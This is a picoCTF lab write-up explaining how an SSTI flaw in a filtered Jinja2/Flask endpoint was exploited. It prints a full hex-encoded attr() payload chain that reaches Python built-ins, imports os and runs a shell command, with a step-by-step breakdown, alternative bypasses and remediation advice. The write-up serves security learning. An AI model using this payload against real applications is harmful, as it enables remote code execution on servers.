---
vulnerability: SSTI
platform: picoCTF
difficulty: Medium
date: 2025-11-23
---
# Lab: SSTI with Advanced Filter Bypass

- Date: 2025-23-11
- Platform: picoCTF
- Difficulty: Medium
- Vulnerability: Server-Side Template Injection (SSTI) with Character Filter Bypass

## Lab Description
- This challenge involved exploiting an SSTI vulnerability in a Jinja2 template engine with aggressive character filtering. The application blocked common SSTI payloads by filtering underscores, dots, and specific keywords, requiring advanced obfuscation techniques to achieve remote code execution.

## Key Steps
- Template Engine Identification: Confirmed Jinja2 with {{7*7}} returning 49
- Filter Analysis: Discovered blocking of underscores, dots, and keywords like class, globals, import
- Character Encoding Bypass: Used hex encoding (\x5f for underscore) to evade filters
- Object Traversal: Built complex chain using request object and attribute access
- Command Execution: Successfully executed system commands to retrieve the flag

## Vulnerable Endpoint
```
POST /evaluate HTTP/1.1
Content-Type: application/x-www-form-urlencoded
expression=USER_INPUT
```

## Filter Bypass Technique
- The application filtered:
1. Underscores (_)
2. Dots (.)
3. Keywords: class, globals, import, os, subprocess
- Bypass Method: Hex encoding of blocked characters
1. _ → \x5f
2. Built-in methods accessed via attr() filter

## Exploitation Payload
```{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}```

## Payload Breakdown
1. request|attr('application') - Access Flask request object
2. |attr('\x5f\x5fglobals\x5f\x5f') - Access globals dictionary (hex encoded)
3. |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f') - Retrieve builtins module
4. |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f') - Access import function
5. ('os')|attr('popen')('cat flag') - Import os module and execute command
6. |attr('read')() - Read command output

## Alternative Bypass Methods Tested
- String concatenation: '__cla'+'ss__'
- Different object starting points: config, self, lipsum
- URL encoding and Unicode alternatives

## Lesson Learned
- Hex encoding effectively bypasses character-based filters in template engines
- The attr() filter provides an alternative to dot notation in Jinja2
- request.application offers reliable access to Python globals in Flask applications
- Comprehensive filter evasion requires multiple encoding techniques

## Remediation
- Implement strict allow-list input validation for template expressions
- Disable access to dangerous Python built-ins in template environments
- Use sandboxed template rendering environments
- Avoid direct user input in template rendering contexts

# Real-World Impact:
    This type of filter bypass demonstrates that simple character blacklisting is insufficient for preventing SSTI attacks. Determined attackers can use encoding and alternative syntax to evade basic security controls.